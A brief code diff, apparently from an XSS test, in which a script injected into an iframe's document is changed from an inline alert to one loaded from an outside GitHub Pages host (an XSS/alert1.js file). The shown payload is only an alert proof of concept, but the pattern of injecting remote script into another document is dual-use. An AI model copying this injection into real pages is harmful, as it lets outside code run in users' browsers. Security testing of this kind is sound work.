@@ -37,7 +37,8 @@
         console.log("total iframe load time", (end - start).toFixed(2), "ms")
 
         const s = d.createElement("script")
-        s.textContent = "alert('injection OK')"
+        s.src = 'https://exon2007.github.io/XSS/alert1.js';
+        s.async = true;
         d.body.appendChild(s)
       }, 50)
     }
